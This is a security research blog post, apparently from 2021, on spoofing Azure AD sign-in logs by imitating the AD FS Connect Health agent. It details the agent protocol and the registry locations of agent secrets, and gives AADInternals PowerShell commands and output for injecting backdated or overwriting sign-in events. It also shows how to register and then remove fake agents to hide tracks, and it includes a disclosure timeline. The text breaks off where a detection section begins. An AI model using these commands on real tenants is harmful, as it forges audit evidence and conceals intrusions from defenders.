+++
title = "Spoofing Azure AD sign-ins logs by imitating AD FS Hybrid Health Agent"
date = "2021-07-08"
lastmod = "2021-09-08"
categories =["blog"]
tags = ["Azure Active Directory","Azure","ADFS","on-prem","AADConnect","AzureAD"]
thumbnail = "/images/posts/hhealth.png"
+++

**Azure AD Connect Health** is a feature that allows viewing the health of on-prem hybrid infrastructure components, including Azure AD Connect and AD FS servers. 
Health information is gathered by agents installed on each on-prem hybrid server. Since March 2021, also AD FS sign-in events are gathered and sent to Azure AD.

In this write-up (based on a Threat Analysis <a href="https://www.secureworks.com/research/azure-active-directory-sign-ins-log-tampering" target="_blank">report</a> by Secureworks), I'll explain how anyone with a local administrator access to AD FS server (or proxy), can create arbitrary sign-ins events to Azure AD sign-ins log.
Moreover, I'll show how Global Administrators can register fake agents to Azure AD - even for tenants not using AD FS at all.

<!--more-->
# Introduction

Per <a href="https://docs.microsoft.com/en-us/azure/active-directory/hybrid/whatis-azure-ad-connect#what-is-azure-ad-connect-health" target="_blank"> Azure AD Connect Health</a> documentation:

>  Azure Active Directory (Azure AD) Connect Health provides robust monitoring of your on-premises identity infrastructure. It enables you to maintain a reliable connection to Microsoft 365 and Microsoft Online Services. This reliability is achieved by providing monitoring capabilities for your key identity components. Also, it makes the key data points about these components easily accessible.

After configuration and installation, we can see the health of AD FS services in the Azure AD Portal:

![AD FS health](/images/posts/hhealth_01.png)

We can also drill-down to see details:

![AD FS health](/images/posts/hhealth_02.png)

The logical structure of the hybrid health AD FS services in ArchiMate notation can be seen below: 

![AD FS health structure](/images/posts/hhealth_11.png)

The **service** represents the AD FS service and has the name equal to the hostname property of **AD FS service**:

{{< highlight powershell >}}
# Get the AD FS service name
Get-AdfsProperties | Select Hostname
{{< /highlight>}}

```
HostName            
--------            
sts.fake.myo365.site
```

The **service** consists of **service member**s, which can be either **federation server** or **federation server proxy**. Service members names are equal equal to the hostname of the **server** or the **proxy**:

{{< highlight powershell >}}
# Get the computer host name
$env:COMPUTERNAME
{{< /highlight>}}

```
SERVER
```

To get things going, an agent need to be installed on each AD FS and proxy server. License requirements to use Azure AD Connect Health is **Azure AD Premium P1** or **P2**.

# Hybrid Health agent for AD FS

The Health Agent for AD FS has been there for years to report the health of the service. In March 2021, Microsoft <a href="https://techcommunity.microsoft.com/t5/azure-active-directory-identity/march-identity-updates-public-preview-of-ad-fs-sign-in-activity/ba-p/1994705" target="_blank">announced</a>
that a public preview for <a href="https://docs.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-health-ad-fs-sign-in" target="_blank">AD FS sign-ins in Azure AD reporting</a> is available to all customers.

As soon as this was announced, I took a brief look and noticed that the agent is using Azure service bus (same than PTA authentication and Azure Web Application Proxy). Finally, at the end of May, I had time for
proper research.

Technically, in Azure AD, there are individual logs for a different types of sign-ins:

* SignInLogs
* NonInteractiveUserSignInLogs
* ServicePrincipalSignInLogs
* ManagedIdentitySignInLogs
* ProvisioningLogs
* ADFSSignInLogs
* RiskyUsers
* UserRiskEvents

The "normal" Azure AD sign-ins events are stored to a log called **SignInLogs** and AD FS sign-ins to a log called **ADFSSignInLogs**:

![sign-ins logs: source Secureworks](/images/posts/hhealth_03.png)

If the organisation has an Azure subscription, ADFSSignInLogs can be exported to Log Analytics workspace to be viewed and analysed. Below is an example of events extracted from Log Analytics:

![ADFSSignInLogs: source Secureworks](/images/posts/hhealth_05.png)

Administrators can view sign-ins logs in Azure Admin Portal. However, there is no dedicated tab for ADFSSignInLogs. Instead, AD FS log-in events are shown in **User sign-ins (interactive)** alongside "normal" Azure AD sign-ins events.

Below is an example where we can see AD FS log-in events from above in Azure AD sign-ins log:

![AD FS Security Event: source Secureworks](/images/posts/hhealth_06.png)

The Health Agent for AD FS consists of three services. The one that is responsible for sending the events to Azure AD is **Azure AD Connect Health AD FS Insights Service**:

![AD FS Health Agent services: source Secureworks](/images/posts/hhealth_07.png)

# Process and protocol details

The overall process how AD FS sign-ins events are gathered and sent to Azure AD is illustrated below: 

![AD FS Security Event: source Secureworks](/images/posts/hhealth_08.png)

## Step 1: Log in

First, a user logs in to AD FS using any method configured and available for the user.

## Step 2: Write Event Id 1200

During and after a successful or failed log-in, AD FS server writes multiple auditing events to **Security** log. Auditing is turned on during the installation of the agent and is a prerequisite for gathering events.

The **Event Id 1200** contains details about the log-in event:

![AD FS Security Event: source Secureworks](/images/posts/hhealth_04.png)

{{< highlight xml >}}
<?xml version="1.0" encoding="utf-16"?>
<AuditBase xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="AppTokenAudit">
  <AuditType>AppToken</AuditType>
  <AuditResult>Success</AuditResult>
  <FailureType>None</FailureType>
  <ErrorCode>N/A</ErrorCode>
  <ContextComponents>
    <Component xsi:type="ResourceAuditComponent">
      <RelyingParty>urn:federation:MicrosoftOnline</RelyingParty>
      <ClaimsProvider>AD AUTHORITY</ClaimsProvider>
      <UserId>AADINTERNALS\test</UserId>
    </Component>
    <Component xsi:type="AuthNAuditComponent">
      <PrimaryAuth>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</PrimaryAuth>
      <DeviceAuth>false</DeviceAuth>
      <DeviceId>N/A</DeviceId>
      <MfaPerformed>false</MfaPerformed>
      <MfaMethod>N/A</MfaMethod>
      <TokenBindingProvidedId>false</TokenBindingProvidedId>
      <TokenBindingReferredId>false</TokenBindingReferredId>
      <SsoBindingValidationLevel>TokenUnbound</SsoBindingValidationLevel>
    </Component>
    <Component xsi:type="ProtocolAuditComponent">
      <OAuthClientId>N/A</OAuthClientId>
      <OAuthGrant>N/A</OAuthGrant>
    </Component>
    <Component xsi:type="RequestAuditComponent">
      <Server>http://sts.fake.myo365.site/adfs/services/trust</Server>
      <AuthProtocol>WSFederation</AuthProtocol>
      <NetworkLocation>Intranet</NetworkLocation>
      <IpAddress>10.10.10.30</IpAddress>
      <ForwardedIpAddress />
      <ProxyIpAddress>N/A</ProxyIpAddress>
      <NetworkIpAddress>N/A</NetworkIpAddress>
      <ProxyServer>N/A</ProxyServer>
      <UserAgentString>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36</UserAgentString>
      <Endpoint>/adfs/ls/</Endpoint>
    </Component>
  </ContextComponents>
</AuditBase>
{{< /highlight>}}

## Step 3: Read Events

The agent reads (at least) all Id 1200 events. The agent seems to be monitoring the **Security log** for changes.

## Step 4: Get Service Access Token

The agent gets a **Service Access Token** from Azure AD. The token is fetched by making HTTP POST request to:
```
https://s1.adhybridhealth.azure.com/oauth2/token
```
The body of the request is (line changes added):

{{< highlight xml >}}
grant_type=client_credentials&client_secret=<client_secret>&client_id=<tenant_id>_<machine_id>
{{< /highlight>}}

**&lt;client_secret>** is a so called AgentKey, which is stored to the registry of AD FS server. The AgentKey is "protected" with DPAPI. 
**&lt;client_id>** is a combination of the tenant id and machine id. Both of the values are also stored to the registry.

Parameter     | Registry location
---           | ---
client_secret | HKLM:\SOFTWARE\Microsoft\ADHealthAgent\AgentKey
tenant_id     | HKLM:\SOFTWARE\Microsoft\ADHealthAgent\TenantId
machine_id    | HKLM:\SOFTWARE\Microsoft\Microsoft Online\Reporting\MonitoringAgent\MachineIdentity

As a response, we will have a JSON file containing the service access token:

{{< highlight json >}}
{
	"access_token": "2Fx1s5Th9h4...D4efhRG4",
	"token_type": "bearer",
	"expires_in": 3599
}
{{< /highlight>}}

The service access token is NOT a standard JWT token, but some Microsot encrypted blob. The token is valid for (almost) an hour.


## Step 5: Get Blob Upload Key

The agent gets a **Blob Upload Key** that is required to send the actual events to Azure AD. The key is fetched by making HTTP GET request to:
{{< highlight xml >}}
https://s1.adhybridhealth.azure.com/providers/Microsoft.ADHybridHealthService/monitoringpolicies/<service_id>/keys/BlobUploadKey
{{< /highlight >}}

**&lt;service_id>** refers to the id of **AD FS service** registered to Azure AD during the first agent installation. The id not shown in the Azure Portal, but is luckily also stored to the registry.

Parameter     | Registry location
---           | ---
service_id    | HKLM:\SOFTWARE\Microsoft\ADHealthAgent\ADFS\ServiceId

The **Service Access Token** from the previous step is included in the Authorization header:
```
Authorization: Bearer <service access token>
```

As a response, we will get a URL for the blob storage with a working shared access signature (SAS) token. The **&lt;service_id>** is the service id sent in the request.

{{< highlight xml >}}
https://adhsprodweuaadsynciadata.blob.core.windows.net/adfederationservice-<service_id>?sv=2018-03-28&sr=c&sig=RCrQOWOLr%2FjHIX6%2FxCti1bPmbHgkp4T9eLS07uP%2FyKM%3D&se=2021-07-10T08%3A01%3A46Z&sp=w
{{< /highlight >}}

## Step 6: Get Event Publisher Key

The agent gets an **Event Publisher Key** that is required to send the signature of the events blob to Azure AD. The key is fetched by making HTTP GET request to:
{{< highlight xml >}}
https://s1.adhybridhealth.azure.com/providers/Microsoft.ADHybridHealthService/monitoringpolicies/<service_id>/keys/EventHubPublisherKey
{{< /highlight >}}

**&lt;service_id>** is the same as in the previous step, and the service access token is also used similarly for authentication. 

As a response, we will get a JSON file that is just a single string containing Azure Service Bus endpoint and other related information, including another SAS token.
{{< highlight json >}}
"Endpoint=sb://adhsprodweuehadfsia.servicebus.windows.net/;SharedAccessSignature=SharedAccessSignature sr=sb%3a%2f%2fadhsprodweuehadfsia.servicebus.windows.net%2fadhsprodweuehadfsia%2fPublishers%2f658fe106-a59d-404e-985b-0c1bf3b4f72d&sig=4%2bZ%2bNurnA4%2b4t6dvTG8kqraJMlNzxKF0KFjiBIaZUw4%3d&se=1625904056&skn=RootManageSharedAccessKey;EntityPath=adhsprodweuehadfsia;Publisher=658fe106-a59d-404e-985b-0c1bf3b4f72d"
{{< /highlight>}}

## Step 7: Upload Events to blob storage

The events are sent to blob storage as a json file, which consists of an array of event objects. Below is the json file for the event from the step 2:

{{< highlight json "linenos=inline,hl_lines=14 16 36 37">}}
[
	{
		"UniqueID": "434c2d29-a4a0-4ce2-86f5-1679bbadc948",
		"Server": "SERVER",
		"EventType": 1,
		"PrimaryAuthentication": 33,
		"RequiredAuthType": 1,
		"RelyingParty": "urn:federation:MicrosoftOnline",
		"RelyingPartyName": "",
		"Result": true,
		"DeviceAuthentication": false,
		"URL": "/adfs/ls",
		"User": 1350057402,
		"UserId": "AADINTERNALS\\test",
		"UserIdType": 10,
		"UPN": "test@fabrikam.azurelabs.online",
		"Timestamp": "2021-07-09T07:03:54.9506592Z",
		"Protocol": 2,
		"NetworkLocation": 1,
		"AppTokenFailureType": 0,
		"IPAddress": "10.10.10.30",
		"ClaimsProvider": null,
		"OAuthClientID": null,
		"OAuthTokenRetrievalMethod": null,
		"MFA": null,
		"MFAProviderErrorCode": null,
		"ProxyServer": null,
		"Endpoint": "/adfs/ls/",
		"UserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
		"DeviceID": "",
		"ErrorHitCount": 0,
		"X509CertificateType": null,
		"MFAAuthenticationType": null,
		"ActivityId": "b91630ee-984e-40ff-a7ea-ffefdb472048",
		"ActivityIdAutoGenerated": false,
		"PrimarySid": "S-1-5-21-2918793985-2280761178-2512057791-1602",
		"ImmutableId": "rJcYmpdAz0i3VB7sI6ZDcg=="
	}
]
{{< /highlight>}}

**Note:** From the identity information (rows 14, 16, 36, and 37 from the json file above) Azure AD only cares about UPN. All log-in events are sent to Azure AD. 
However, only those events having an UPN of an existing Azure AD user is added to **ADFSSignInLog**.

Before sending the json file, it is compressed using Gzip.

Agent sents the compressed json file to the blob storage by making HTTP POST to the url received in step 5. The url is modified by adding a file name and api-version to it:
{{< highlight xml >}}
https://adhsprodweuaadsynciadata.blob.core.windows.net/adfederationservice-<service_id>/<id>.json?sv=2018-03-28&sr=c&sig=RCrQOWOLr%2FjHIX6%2FxCti1bPmbHgkp4T9eLS07uP%2FyKM%3D&se=2021-07-10T08%3A01%3A46Z&sp=w&api-version=2017-04-17
{{< /highlight >}}
**&lt;service_id>** is the same than in the previous steps and **&lt;id>** is a random GUID identifying the sent events.

The following HTTP headers are used:
{{< highlight xml >}}
User-Agent: Azure-Storage/8.2.0 (.NET CLR 4.0.30319.42000; Win32NT 10.0.17763.0)
x-ms-version: 2017-04-17
Content-MD5: <MD5Hash>
x-ms-blob-type: BlockBlob
x-ms-client-request-id: <id>
{{< /highlight >}}
**&lt;Md5Hash>** is the MD5 hash calculated from the Gzip compressed json file.
**&lt;id>** is the same id used above.

## Step 8: Send signature to events hub

Before calculating the signature to be sent to the events hub, we need to derive the signature key (this is very interesting):

1. SHA512 hash is calculated from the AgentKey. The AgentKey is a base 64 encoded byte array, but the hash is calculated from the b64 string by converting it to the byte array of ASCII values!
2. The resulting (binary) hash is converted to hex string.
3. Signing key is a result of converting the hex string to byte array by using base 64 decoding !??!??

The next step is to define the string to be signed:
{{< highlight xml >}}
<tenant_id>,<service_id>,<machine_id>,Adfs-UsageMetrics,<blob_url>,<date_string>
{{< /highlight >}}
**&lt;tenant_id>**,**&lt;service_id>**,**&lt;machine_id>** are the values from the steps 4 and 5. **&lt;blob_url>** is the url used in the previous step but without query parameters. 
**&lt;date_string>** is the signing time (UTC) in sortable format like:
```
2021-07-09T10:43:35
```

Signature is calculated by converting the string to a byte array of UNICODE values and by calculating a HMACSHA512 from it using the signing key calculated earlier.
Finally, the signature is base 64 encoded.

Using the endpoint URL from the step 6. a connection is made to Azure Service Bus. Below is the screenshot from Fiddler showing the actual message containing the string to be signed and the actual signature.

![Service Bus Dump](/images/posts/hhealth_09.png)

After sending the signature, the events are shown in the log in 15 minutes or so (can take much longer too).

# Spoofing sign-ins log with AADInternals

**AADInternals v0.5.0** includes the functionality to create fake events using the Hybrid Health Service protocol.

First, we need to get the agent information (requires local administrator rights to AD FS server):

{{< highlight powershell >}}
# Get the agent information and save to a variable
$agentInfo = Get-AADIntHybridHealthServiceAgentInfo
{{< /highlight>}}

Second, we create an array of fake events. This and the next step can be done from any internet-joined computer using the agent information from the previous step.

{{< highlight powershell >}}
# Create an array of fake events
$events=@(
    New-AADIntHybridHealtServiceEvent -Server $agentInfo.Server -UPN "NestorW@contoso.azurelabs.online" -IPAddress "22.22.22.22" -NetworkLocationType Extranet  -Timestamp (Get-Date).AddHours(-1)
    New-AADIntHybridHealtServiceEvent -Server $agentInfo.Server -UPN "DiegoS@contoso.azurelabs.online"  -IPAddress "11.11.11.11" -NetworkLocationType Extranet 
)
{{< /highlight>}}

Finally, we'll send the events! I'm using -Verbose switch here to see what's going on under-the-hood:

{{< highlight powershell >}}
# Send the events
Send-AADIntHybridHealthServiceEvents -AgentInfo $agentInfo -Events $events -Verbose
{{< /highlight>}}

**Output:**
```
VERBOSE: POST https://s1.adhybridhealth.azure.com/oauth2/token with -1-byte payload
VERBOSE: received 443-byte response of content type application/json; charset=UTF-8
VERBOSE: GET https://s1.adhybridhealth.azure.com/providers/Microsoft.ADHybridHealthService/monitoringpolicies/50abc8f3-243a-4ac1-a3fb-712054d7334b/keys/BlobUploadKey with 0-byte payload
VERBOSE: received 218-byte response of content type application/json; charset=utf-8
VERBOSE: GET https://s1.adhybridhealth.azure.com/providers/Microsoft.ADHybridHealthService/monitoringpolicies/50abc8f3-243a-4ac1-a3fb-712054d7334b/keys/EventHubPublisherKey with 0-byte payload
VERBOSE: received 411-byte response of content type application/json; charset=utf-8
VERBOSE: Get-CompressedByteArray
VERBOSE: PUT https://adhsprodweuaadsynciadata.blob.core.windows.net/adfederationservice-50abc8f3-243a-4ac1-a3fb-712054d7334b/a653012f-522a-4d47-b4b5-a753ccebd353.json?sv=2018-03-28&sr=c&sig=cwyvMgry1h5IyfA3hQwKX1%2FoOPibv1lvZq7fbPSwF4U%3D&se=2021-07-10T12:16:57Z&sp=w&api-version=2017-04-17 with -1-byte payload
VERBOSE: received 0-byte response of content type 
VERBOSE: Opening websocket: wss://adhsprodweuehadfsia.servicebus.windows.net/$servicebus/websocket
VERBOSE: IN: @{Type=Protocol SASL; Protocol=3; Major=1; Minor=0; Revision=0}
VERBOSE: OUT:@{Type=Protocol SASL; Protocol=3; Major=1; Minor=0; Revision=0}
VERBOSE: IN: @{Type=Protocol SASL; Protocol=3; Major=1; Minor=0; Revision=0}
VERBOSE: IN: @{Size=63; DOFF=2; Extended Header=System.Object[]; Type=SASL Mechanisms; Content=System.Object[]}
VERBOSE: IN: @{Size=26; DOFF=2; Extended Header=System.Object[]}
VERBOSE: OUT:@{Size=26; DOFF=2; Extended Header=System.Object[]}
VERBOSE: IN: @{Size=26; DOFF=2; Extended Header=System.Object[]; Type=SASL Outcome; Status=ok; Message=Welcome!}
VERBOSE: IN: @{Type=Protocol AMQP; Protocol=0; Major=1; Minor=0; Revision=0}
VERBOSE: OUT:@{Type=Protocol AMQP; Protocol=0; Major=1; Minor=0; Revision=0}
VERBOSE: IN: @{Type=Protocol AMQP; Protocol=0; Major=1; Minor=0; Revision=0}
VERBOSE: IN: @{Size=106; DOFF=2; Extended Header=System.Object[]; Type=AQMP Open; Channel=0; ContainerId=ed0739c1de7a6d907f304916220bea5b; HostName=adhsprodweuehadfsia.servicebus.windows.net; MaxFrameSize=65536; ChannelMax=8191; IdleTimeOut=; OutgoingLocales=; IncomingLocales=; OfferedCapabilities=; DesiredCapabilities=; Properties=}
VERBOSE: OUT:@{Size=106; DOFF=2; Extended Header=System.Object[]; Type=AQMP Open; Channel=0; ContainerId=ed0739c1de7a6d907f304916220bea5b; HostName=adhsprodweuehadfsia.servicebus.windows.net; MaxFrameSize=65536; ChannelMax=8191; IdleTimeOut=; OutgoingLocales=; IncomingLocales=; OfferedCapabilities=; DesiredCapabilities=; Properties=}
VERBOSE: IN: @{Size=71; DOFF=2; Extended Header=System.Object[]; Type=AQMP Open; Channel=0; ContainerId=31e228ec82a74f9cbd981e4b535a974b_G22; HostName=; MaxFrameSize=65536; ChannelMax=4999; IdleTimeOut=120000; OutgoingLocales=; IncomingLocales=; OfferedCapabilities=; DesiredCapabilities=; Properties=}
VERBOSE: IN: @{Size=35; DOFF=2; Extended Header=System.Object[]; Type=AQMP Begin; Channel=0; RemoteChannel=; NextOutgoingId=1; IncomingWindow=5000; OutgoingWindow=5000; HandleMax=262143; OfferedCapabilities=; DesiredCapabilities=; Properties=}
VERBOSE: OUT:@{Size=35; DOFF=2; Extended Header=System.Object[]; Type=AQMP Begin; Channel=0; RemoteChannel=; NextOutgoingId=1; IncomingWindow=5000; OutgoingWindow=5000; HandleMax=262143; OfferedCapabilities=; DesiredCapabilities=; Properties=}
VERBOSE: IN: @{Size=34; DOFF=2; Extended Header=System.Object[]; Type=AQMP Begin; Channel=0; RemoteChannel=0; NextOutgoingId=1; IncomingWindow=5000; OutgoingWindow=5000; HandleMax=255; OfferedCapabilities=; DesiredCapabilities=; Properties=}
VERBOSE: IN: @{Size=124; DOFF=2; Extended Header=System.Object[]; Type=AQMP Attach; Channel=0; Name=duplex64193:64195:64196:sender; Handle=0; Direction=out; Target=$cbs; TrackingId=69968}
VERBOSE: OUT:@{Size=124; DOFF=2; Extended Header=System.Object[]; Type=AQMP Attach; Channel=0; Name=duplex64193:64195:64196:sender; Handle=0; Direction=out; Target=$cbs; TrackingId=69968}
VERBOSE: IN: @{Size=132; DOFF=2; Extended Header=System.Object[]; Type=AQMP Attach; Channel=0; Name=duplex64193:64195:64196:sender; Handle=0; Direction=in; Target=@ ; TrackingId=69968}
VERBOSE: IN: @{Size=36; DOFF=2; Extended Header=System.Object[]; Type=AQMP Flow; Channel=0; NextIncomingId=1; IncomingWindow=5000; NextOutgoingId=1; OutgoingWindow=5000; Handle=0; DeliveryCount=0; LinkCredit=100; Available=0; Drain=; Echo=False; Properties=}
VERBOSE: IN: @{Size=159; DOFF=2; Extended Header=System.Object[]; Type=AQMP Attach; Channel=0; Name=duplex64193:64195:64196:receiver; Handle=1; Direction=in; Target=$cbs; TrackingId=69968}
VERBOSE: OUT:@{Size=159; DOFF=2; Extended Header=System.Object[]; Type=AQMP Attach; Channel=0; Name=duplex64193:64195:64196:receiver; Handle=1; Direction=in; Target=$cbs; TrackingId=69968}
VERBOSE: IN: @{Size=167; DOFF=2; Extended Header=System.Object[]; Type=AQMP Attach; Channel=0; Name=duplex64193:64195:64196:receiver; Handle=1; Direction=out; Target=ed0739c1de7a6d907f304916220bea5b; TrackingId=69968}
VERBOSE: IN: @{Size=37; DOFF=2; Extended Header=System.Object[]; Type=AQMP Flow; Channel=0; NextIncomingId=1; IncomingWindow=5000; NextOutgoingId=1; OutgoingWindow=5000; Handle=1; DeliveryCount=0; LinkCredit=50; Available=0; Drain=; Echo=False; Properties=}
VERBOSE: OUT:@{Size=37; DOFF=2; Extended Header=System.Object[]; Type=AQMP Flow; Channel=0; NextIncomingId=1; IncomingWindow=5000; NextOutgoingId=1; OutgoingWindow=5000; Handle=1; DeliveryCount=0; LinkCredit=50; Available=0; Drain=; Echo=False; Properties=}
VERBOSE: IN: @{Size=556; DOFF=2; Extended Header=System.Object[]; Type=AQMP Transfer; Channel=0; Handle=0; DeliveryId=0; DeliveryTag=Qw==; MessageFormat=0; Settled=True; More=False; RcvSettleMode=; State=; Resume=; Aborted=; Batchable=False}
VERBOSE: OUT:@{Size=556; DOFF=2; Extended Header=System.Object[]; Type=AQMP Transfer; Channel=0; Handle=0; DeliveryId=0; DeliveryTag=Qw==; MessageFormat=0; Settled=True; More=False; RcvSettleMode=; State=; Resume=; Aborted=; Batchable=False}
VERBOSE: IN: @{Size=113; DOFF=2; Extended Header=System.Object[]; Type=AQMP Transfer; Channel=0; Handle=1; DeliveryId=0; DeliveryTag=AQAAAEM=; MessageFormat=0; Settled=True; More=False; RcvSettleMode=; State=; Resume=; Aborted=; Batchable=False}
VERBOSE: IN: @{Size=266; DOFF=2; Extended Header=System.Object[]; Type=AQMP Attach; Channel=0; Name=479fb98dc6864904aade7b577963e835;64193:64194:64199; Handle=2; Direction=out; Target=adhsprodweuehadfsia/Publishers/66543d53-b49b-483b-9312-b8c5fdfea30c; TrackingId=7}
VERBOSE: OUT:@{Size=266; DOFF=2; Extended Header=System.Object[]; Type=AQMP Attach; Channel=0; Name=479fb98dc6864904aade7b577963e835;64193:64194:64199; Handle=2; Direction=out; Target=adhsprodweuehadfsia/Publishers/66543d53-b49b-483b-9312-b8c5fdfea30c; TrackingId=7}
VERBOSE: IN: @{Size=5469120; DOFF=23; Extended Header=System.Object[]}
VERBOSE: IN: @{Size=580; DOFF=2; Extended Header=System.Object[]; Type=AQMP Transfer; Channel=0; Handle=2; DeliveryId=0; DeliveryTag=AQAAAEM=; MessageFormat=0; Settled=; More=False; RcvSettleMode=; State=; Resume=; Aborted=; Batchable=True}
VERBOSE: OUT:@{Size=580; DOFF=2; Extended Header=System.Object[]; Type=AQMP Transfer; Channel=0; Handle=2; DeliveryId=0; DeliveryTag=AQAAAEM=; MessageFormat=0; Settled=; More=False; RcvSettleMode=; State=; Resume=; Aborted=; Batchable=True}
VERBOSE: IN: @{Size=17; DOFF=2; Extended Header=System.Object[]; Type=AQMP Detach; Channel=0; Handle=0; Closed=True; Error=}
VERBOSE: OUT:@{Size=17; DOFF=2; Extended Header=System.Object[]; Type=AQMP Detach; Channel=0; Handle=0; Closed=True; Error=}
VERBOSE: IN: @{Size=18; DOFF=2; Extended Header=System.Object[]; Type=AQMP Detach; Channel=0; Handle=1; Closed=True; Error=}
VERBOSE: OUT:@{Size=18; DOFF=2; Extended Header=System.Object[]; Type=AQMP Detach; Channel=0; Handle=1; Closed=True; Error=}
VERBOSE: IN: @{Size=18; DOFF=2; Extended Header=System.Object[]; Type=AQMP Detach; Channel=0; Handle=2; Closed=True; Error=}
VERBOSE: OUT:@{Size=18; DOFF=2; Extended Header=System.Object[]; Type=AQMP Detach; Channel=0; Handle=2; Closed=True; Error=}
VERBOSE: IN: @{Size=15; DOFF=2; Extended Header=System.Object[]; Type=AQMP End; Channel=0; Error=}
VERBOSE: OUT:@{Size=15; DOFF=2; Extended Header=System.Object[]; Type=AQMP End; Channel=0; Error=}
VERBOSE: Closing websocket
```

After 15 min or so, the events appear in the **sign-ins (interactive)** log. And as we can see, we were able to alter also the sign-ins time:

![Fake events](/images/posts/hhealth_10.png)

# Tampering with sign-ins log 

Studying the protocol and the information sent to Azure AD, I noticed that the **Request ID** in the sign-ins is equal to the **UniqueID** of the event.
![UniqueID & Request Id](/images/posts/hhealth_16.png)

This made me wonder what happens if I use an existing **Request ID** as **UniqueID** for the events:
{{< highlight powershell >}}
# Create an event using existing Request ID as UniqueID
$events=@(
    New-AADIntHybridHealtServiceEvent -UniqueID "8d62c873-3d82-48f9-a30b-532be551709c" -Server $agentInfo.Server -UPN "NestorW@contoso.azurelabs.online" -IPAddress "22.22.22.22" -NetworkLocationType Extranet
)
{{< /highlight>}}

It turned out that **the fake event overwrote the existing event!** This allowed threat actors to hide their log-in activities by replacing their log-ins with arbitrary information.

**Timeline:**

Date | Activity
---  | ---
May 30th 2021 | Discovery of the vulnerability
May 31st 2021 | Reported the vulnerability to Microsoft
Jun  6th 2021 | Shared tool with Microsoft to reproduce the issue
Jun 16th 2021 | Microsoft confirmed the behaviour and indicated reviewing the report for a bounty award
Jul  2nd 2021 | Microsoft awarded bounty of 10000 USD (Severity: Important, Security Impact: Spoofing)
Jul  2nd 2021 | Disagreed with the severity and impact - spoofing is spoofing and tampering is tampering..
Jul  6th 2021 | Microsoft reported that a fix had been applied
Jul  7th 2021 | Confirmed the fix adressed the issue: <br><br>Now all events will get a randomly generated **Request ID** so the tampering is not possible anymore.


# Registering fake agents with AADInternals v0.5.0 and later

Creating fake log-in events using an existing agent requires local administrator access to the server where the agent is installed. With **Global Administrator** permissions, this can also be done remotely,
as fake agents can be registered from any computer with internet connect - even for tenants which do not have AD FS.

**Note:** For some reason, the **registration events are not logged to the audit log**, making it very easy to hide your tracks!

## Registering hybrid health service
First, we need to create a new hybrid health service:

{{< highlight powershell>}}
# Get an access token and save it to the cache:
Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache

# Create a new AD FS service
New-AADIntHybridHealthService -DisplayName "sts.company.com" -Signature "sts.company.com" -Type AdFederationService
{{< /highlight>}}

```
activeAlerts                             : 0
additionalInformation                    : 
createdDate                              : 2021-07-12T07:25:29.1009287Z
customNotificationEmails                 : 
disabled                                 : False
displayName                              : sts.company.com
health                                   : Healthy
lastDisabled                             : 
lastUpdated                              : 0001-01-01T00:00:00
monitoringConfigurationsComputed         : 
monitoringConfigurationsCustomized       : 
notificationEmailEnabled                 : True
notificationEmailEnabledForGlobalAdmins  : True
notificationEmails                       : 
notificationEmailsEnabledForGlobalAdmins : False
resolvedAlerts                           : 0
serviceId                                : 189c61bb-2c9c-4e86-b038-d0257c6c559e
serviceMembers                           : 
serviceName                              : AdFederationService-sts.company.com
signature                                : sts.company.com
simpleProperties                         : 
tenantId                                 : c5ff949d-2696-4b68-9e13-055f19ed2d51
type                                     : AdFederationService
originalDisabledState                    : False
```

The new service will now appear in the list of AD FS services:

![New service](/images/posts/hhealth_12.png)

As we can see, the status of the service is currently **Unmonitored**. This is because we have not registered any service members yet.

## Registering AD FS server

Let's next register a new AD FS server:

{{< highlight powershell>}}
# List the service names
Get-AADIntHybridHealthServices -Service AdFederationService | ft serviceName
{{< /highlight>}}

```
serviceName                             
-----------                             
AdFederationService-sts.company.com     
AdFederationService-sts.fake.myo365.site
```

{{< highlight powershell>}}
# Register a new AD FS server
Register-AADIntHybridHealthServiceAgent -ServiceName "AdFederationService-sts.company.com" -MachineName "ADFS01" -MachineRole AdfsServer_2016
{{< /highlight>}}

```
Agent info saved to         "AdFederationService-sts.company.com_c5ff949d-2696-4b68-9e13-055f19ed2d51_224a18a0-b450-477c-a437-07916855e570_ADFS01.json"
Client sertificate saved to "AdFederationService-sts.company.com_c5ff949d-2696-4b68-9e13-055f19ed2d51_224a18a0-b450-477c-a437-07916855e570_ADFS01.pfx"
```

Agent information (AgentKey etc.) is saved to a .json file and the agent's certificate to a .pfx file (empty password).

Now the service status has changed to **Healthy**:
![New service - status healthy](/images/posts/hhealth_15.png)

Clicking the service will show the details of the service and we can see there is one registered AD FS server:
![New service - status healthy](/images/posts/hhealth_13.png)

Clicking anywhere in the Overview box will show the list of all registered agents:
![New service - status healthy](/images/posts/hhealth_14.png)

Multiple servers and proxies can be registered with the same process.

## Creating fake events

Now we can create fake events same way we did <a href="#spoofing-sign-ins-log-with-aadinternals">above</a>:

Now we can load the agent information to a variable and create fake events as <a href="#spoofing-sign-in-log-with-aadinternals">above</a>:

{{< highlight powershell >}}
# Load the agent information and save to a variable
$agentInfo = Get-Content "AdFederationService-sts.company.com_c5ff949d-2696-4b68-9e13-055f19ed2d51_224a18a0-b450-477c-a437-07916855e570_ADFS01.json" | ConvertFrom-Json

# Send the events
Send-AADIntHybridHealthServiceEvents -AgentInfo $agentInfo -Events $events -Verbose
{{< /highlight>}}

## Removing fake services and agents

Finally, to hide your tracks, you can remove the service and agents:
{{< highlight powershell>}}
# Remove the service and agents
Remove-AADIntHybridHealthService -ServiceName "AdFederationService-sts.company.com"
{{< /highlight>}}

**Note:** I was able to create AD FS service and register agents also to the tenant without Azure Premium P1 or P2 subscription. However, the events won't appear in the Azure AD sign-ins log and service 
can't be viewed from the Azure Portal.


# How to detect

## Exporting agent secrets
After original publication of this blog, <a href="https://twitter.com/Cyb3rWard0g" target="_blank">@Cyb3rWard0g</a> created <a href="https://github.com/SigmaHQ/sigma/pull/1934" target="_blank">Sigma</a>
